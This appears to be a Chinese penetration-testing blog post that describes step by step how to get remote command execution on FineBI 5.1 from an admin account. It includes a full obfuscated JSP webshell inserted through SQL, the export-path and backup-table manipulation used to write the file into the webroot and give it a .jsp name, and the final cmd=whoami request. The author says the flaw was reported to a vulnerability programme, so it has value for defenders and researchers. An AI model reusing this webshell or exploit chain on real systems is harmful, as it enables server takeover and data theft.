> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5kAMy_VfRB8OdqtwEErAWw)

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfcA5nCQJQ3NZY2DW0cyReHNCgcnZwE99OwFoVZyic1yQlwHb7dFdeF5ODwvciaLicRib0aDu4fgkVmZuA/640?wx_fmt=png)

最近团队在对某个厂商进行测试，辛辛苦苦搞了快一个星期才拿到一个 shell，弟弟太惨了  

### 0x01 开始复现

访问 url 进入登录界面，输入管理密码进入页面

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RRarjB4ziaFHlSoiaDk57bn2J9TvuvQWBcziaeIjicQHoWQQQzVExSj0UIQ/640?wx_fmt=png)

请装作没有看到我那个失败的 XSS，过了这么久也忘记在哪里改回来了

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2Rc2VMsD52fX37MdyZ8Z6GcJq868NnsLcqTlDPicicjNupMlAH5LiaDByXA/640?wx_fmt=png)

进入页面

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2R6sxfNcBH4DJlrnWg5lR9fsXIia15cFgWOz5tiaPCiazJO1eBalvKYibLYg/640?wx_fmt=png)

我这咋一看，我丢这不是和通某 OA 差不多吗，当初通某 OA 刚发的时候，全是 XSS，越权，SQL 注入，未授权啥的，那时候也是更上了那次风，小赚了一笔

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RNAqA64jMeuhe12MHBO8LicQXb0KiaU8qbCaWliaC03IBItBibjgPwK9LRQ/640?wx_fmt=png)

好了，不扯皮了，正式开始复现，进入页面后，点击数据准备

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RCSIE9XVg4QPSfsLxyHRIHtfFfpVT5j9Tibr8r1lswVTSeSpoYS7Xfqg/640?wx_fmt=png)

添加一个业务包，点击进去后发现可以添加数据表

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2Rnqj2OEYTLSLNDV8okUzvvzzyqic9henI01kTQ4Z8z52CN6kB4VvGvmw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RWCItiac4WrRgQ9licKHOdG8EWz56k8VBicHRemwnqBbYk8rufsiaohwzKw/640?wx_fmt=png)

在一看右上角有一个全局更新，点进入一看，我丢，数据表内容可以任意位置存放

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2Ryyoic4oH4EpibRjULxVDmRS3Z76h6OjRUufTdo09sKZib4ov8ohN36Fxg/640?wx_fmt=png)

看到之后，心想这不就翱翔了嘛，系统管理处好像有个添加数据库连接，这波就直接在本地数据库插入一个马子，在到这里一连接，然后一添加表，在一导出，不就直接 getshell 啦

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2Rmd0QhwPLlqPibrJHVc3apM1PhL205N6M3381XRrRQ7N0qJcDxwc9Pag/640?wx_fmt=png)

直接开始操作，进入本地数据库，选择 phpstuby 创建数据库自带的 sys 数据库，进入在创建一个 test 表

> use sys ; create table test(test varchar(2555) not null);

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2R5d88ibKexo9FbkhicxZOReIMCjn9929jhogT0W2BJoTyGlI5ITUSNYLw/640?wx_fmt=png)

在数据库中插入木马内容，因为是 java 环境就是插入 jsp 的马子

> insert into test(test) values ('<%if(request.getParameter("cmd")!=null){Class rt = Class.forName(new String(new byte[] { 106， 97， 118， 97， 46， 108， 97， 110， 103， 46， 82， 117， 110， 116， 105， 109， 101 }));Process e = (Process) rt.getMethod(new String(new byte[] { 101， 120， 101， 99 })， String.class).invoke(rt.getMethod(new String(new byte[] { 103， 101， 116， 82， 117， 110， 116， 105， 109， 101 })).invoke(null)， request.getParameter("cmd") );java.io.InputStream in = e.getInputStream();int a = -1;byte[] b = new byte[2048];out.print("
> 
> ```
> ");while((a=in.read(b))!=-1){ out.println(new String(b)); }out.print("
> ```
> 
> ");} %>');

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2R7mWFtmlyfs2Pb5RGA9TqAHjnyZLCnJwF0E8QtTTNMEgSs10YTMuPDg/640?wx_fmt=png)

回到系统中，将自己数据库添加进去，系统管理 - 数据连接 - 数据连接管理 - 新建数据连接

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2R2UMNEr67uAiavU780m43194F52wGpGhvu3hOYJ2s1j3Oic5lyqQOI4Ew/640?wx_fmt=png)

选择 mysql，添加配置

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RWBG5znXfT6ZoTfbOp8ia12CosO4MMTwSJXTcQxNWClOr9U5aPvDS1ZQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RdkiblhYQWQ15umEs3q6YzkVDQu9ujIkLR5PSZpZEYm8p5rAOx1ibbrZw/640?wx_fmt=png)

测试连接

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RH36IM5IMgjORetYwFC2QXKjrQ18a6WE6tcaVib6plGibc9o0cayN3ibIg/640?wx_fmt=png)

回到数据准备处

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2Rnqj2OEYTLSLNDV8okUzvvzzyqic9henI01kTQ4Z8z52CN6kB4VvGvmw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2Rnqj2OEYTLSLNDV8okUzvvzzyqic9henI01kTQ4Z8z52CN6kB4VvGvmw/640?wx_fmt=png)

找到我们创建的 test 数据库中 test 的数据表，确定

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2Rvd3tvlR4uWacO77rqBTJUoAYw437PQicCWTibObN7jvJJ4njfCrE0oEQ/640?wx_fmt=png)

查看我们的马子：

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RfWbYjyJiau5UedLdj5OYKKjjBrJJiaus8CLy8tewv4ydswrr3FSmYBGA/640?wx_fmt=png)

马上见证奇迹的时候了

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RINHf2vvIic2LLywTibg2yznZbZEUgLf7Pr8lLu1SicZic7jqib1mfYyM7AA/640?wx_fmt=png)

点击全局更新，修改下路径，注：因为路由问题，是无法直接访问的，需要放到 `C:\FineBI5.1\webapps\webroot\scripts` 路径下，但因为目录下必须为空，所以需要在前面随意添加目录，它会自动创建

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RNu1LyEcFK4Il9neJqiaeTdYsF4Q51odCctiaCvfJO8uOIqUia0ZOPjYibw/640?wx_fmt=png)

点击立刻更新多维数据库

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RC5RnJIc0BiaTeMkIaoOEia1OTZYyfEbMvY3MUEftkUBd1yg5GicKkia4ew/640?wx_fmt=png)

注：它默认会有很多数据，建议提前全部删除，我这里之前已经删了，就不搞了

查看文件是否到了指定目录，文件位置在 

> C:\FineBI5.1\webapps\webroot\scripts\admin\db\T_C162F2\super\P-1\S-1 下

查看文件中

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RAye2XHU0kB7KCuP2bdCbdvhEp3JyqK60s9qjnLFgJQqSV8zIOYIgEg/640?wx_fmt=png)

然后我们就发现了一个很严重的问题..... 不是 jsp 后缀，这不就当场裂开了吗

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2Rq2XViaWBRIHcQTJObHdeGE0va5N1wSgYSR9CqYXzDEO3dEZC9Q8l2jA/640?wx_fmt=png)

但是现在就差着临门一脚，怎么可能半途放弃，现在能解决我现在就两种方法了，文件包含，和任意文件名修改了，不过 java 站好像没得文件包含吧，手动滑稽，现在就只能一条路了，任意文件名修改，其实的话，原本是有一个的... 但是是我朋友先发现的，就提交给某天了，导致没得用，现在就简单的给大家看一下

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2R37TP4KzSE8faheqOf6uJ7SiauBZmr5ObNEn5hMiapzqSnpRwQxw5D4zQ/640?wx_fmt=png)

就是这个位置，任意文件名修改，用个 burp 抓个包改就好了，具体就不演示了，然后还有什么办法了呢，想了一天之后，终于给我找到了一处可能可以的

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RuAoYStCjjMAM9wYa8oswVQ6nqHZnkPPT4z2oB9hViclnWL1otgm6Hdg/640?wx_fmt=png)

位置在：管理系统 - 智能运维 - 备份还原处

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2REhmw8KgREiaiblI4wEa4l0aHw3OBmg9jMqvDHsibckSrMaxvpJmBAzxgg/640?wx_fmt=png)

看到左上角角落里躲着一直设置的图标，点击一下

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RM2Aacm15D4sDuCMq9PIPOAuFqTZzdn7WLSkaDSMeezd7xyeFxNL4Tw/640?wx_fmt=png)

可以看到这又是一个任意文件存放，但是没啥用因为我们要的是任意文件名修改，所以主题不在这里，随意改一下备份路径等下好找，保持，回到页面，点击一下手动备份，名字随意

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2Rcf0mM76ur12QQIf3S5TPAa2rrdnVYoskEHgsu1ntso0PcNxjpbjukw/640?wx_fmt=png)

现在重点来了，拿小本本记号，必考

勾选之前的备份，开启 burp，点击重命名

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RlLiaRbdY7QQ0Thdc0GiafekfeSefory7GJLAUZjOhBFDyIicA5LYndySQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RVkdreC2jy45RCx5YGE5LNo3C62qBlLRjXGahsZYSPayHocOHJSFC3A/640?wx_fmt=png)

发现好像只有一个 ID 来判断文件， 没有指定文件名，当时脑子就一晃，难道我就真的不能 getshell 了吗 

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RN45KwI2ESaCUrRQWqO8FP7cGciat9abZKkW9wtktg0icTB3ibbMmpviagw/640?wx_fmt=png)

不不不，仔细一想，它好像走的是数据库欸，然后一个 ID 和一个 name，那么数据库中必定包含着文件路径，要不然怎么修改，对了忘记给文件路径的图片了，文件目录在

> C:\FineBI5.1\webapps\webroot\backup\config\manual\

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RVDVpvz55nnOTKiaX4MQVxMmpeRpADrUbPFBzn7iamgPlkicLagpR4ibPgA/640?wx_fmt=png)

这么长的路径，不管怎么说都得有个路径吧，现在就进入数据库找一找，

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2R1vDnNJTm8pEibdRmMY7Zic56ZJhazy7T9GS2ibhLfKyHUeEvzMUDo8GQA/640?wx_fmt=png)

不负所望有了路径，应该只需要需要 backupName 和 savePath 两个参数就可以实现任意文件名修改了

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RAm67iasLVO5Yzg2SHsNrgKtrER9icJIdNR4vvjrLK7I7C2eNWy5iapKlw/640?wx_fmt=png)

现在就会有人问了，怎么才能连接数据库呢，不着急且听我慢慢道来，，在系统中有管理权限，可以配置外接数据库，只要有一台外网服务器，一个符合数据库版本和允许远程登录的数据库，不就成了么

#### 开始实现：

位置在: 管理系统 - 系统管理 - 常规 - 外接数据库

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RuMnjXtmOq7O3Ly6qefch3ziaL1wueCBropM2GbNJB5cXuicAW0sywNrA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2R11gunsneCaJu7pfQbSXPAKLDibIptnMicib1qVddxOPXDia43L8HnVZrrw/640?wx_fmt=png)

家境贫寒没有服务器，就找个我兄弟的服务用了一下，等下和他意思意思一下就可以了，现在说一下为什么要配置外接数据库，Finebi5.1 配置了外接，内容所有数据都会存入外接数据库当中，然后.... 手动滑稽

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RlU9MY3nc9vDeEf2DWH0gTXV9u8AZrggUnUpa9r57zclQBEDic2QPYEA/640?wx_fmt=png)

注意数据库版本是被指定的

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2R5fTXCle1PdpydvJ7J0EzQjVdnzyvx7VibJa1fibNybXEPzQgeXfQPdMg/640?wx_fmt=png)

咳咳，回到正题，现在我们开始修改数据库内容，至于表怎么找到的，别问，问就是一个一个翻

> update fine_backup_node set backup where backupName='2020.12.29_10.11.24123';

> update fine_backup_node set savePath="../scripts/admin/db/T_C162F2/super/P-1/S-1" where savePath='../backup/config/manual';

再次查看发现已经修改成功

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RR7yCbIwqSjbTWNTAnI8es58OC3ibhrVMeUibljPPV0eY39Mb85Id5vKg/640?wx_fmt=png)

这里说一下，为什么是把文件名改为 `col-0-dic`，而不是直接加上 `jsp`，因为它这个是会在指定的那个路径去寻找文件，如果改为 `col-0-dic.jsp` 就找不到文件了，所有现在就开始快乐的修改文件名环节

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2R0gicF7IStibZ7xicibWTIPXkpaiawLJonhghJMh9h2oTJ9LDK96KKGfiaNhw/640?wx_fmt=png)

修改数据库后，回到系统后，刷新

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RSYXJNhcOyp4ItYXcAJfJNdIuZvlz58bMzZvXojH7EiatWicicc6ldZkjg/640?wx_fmt=png)

可以看到文件名已经修改，现在开始重命名添加上 jsp 后缀

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2R20DE5QPfk9jWGdpicEOtKVPE8axRYpyLHI9t8chDRdN1JHp0ibAsKeQw/640?wx_fmt=png)

保存，到主机上查看

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2Ria7OHv6UbbWAxyRFrvpTmic5WKBehtyfFocKAvQvt0hIiaVKUpqJqJ3BQ/640?wx_fmt=png)

发现已经被修改，访问执行 whoami，参数是 cmd，GET 请求

> IP: 端口 / webroot/scripts/admin/db/T_C162F2/super/P-1/S-1/col-0-dic.jsp?cmd=whoami

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RLibfSWJSw3KWCZOGpGd1ZzX05JHLGN1yH89pvdhF8LSkmKrfjh2bF4Q/640?wx_fmt=png)

成功了，历时五天六个小时，终于 getshell 了

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAff9JaLnDjbxzwynibf0uKia2RH6icG7dofslfH5lVXAUVUbPJvaHQOpcAicP6LL5kX8ha31kfONQGOaPw/640?wx_fmt=png)

### 0x04 结语

现在就是已经拿到 shell 权限了，因为是用管理权限运行的，至少都是一个管理员权限，不就想干啥干啥了，然后其中还有很多很多挫折的，试了很多很多方法，才找到一个 (果然还是我太菜)，但还是不负众望 (相关漏洞已提交至某天 src)

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfedqfl5QehVp9Lz864qiaaP5oJUYHWYpADeHrm1ZO6g5yVq5ibe7kKBHrBtjic7CoaJnOLR1y7E5mmtA/640?wx_fmt=png)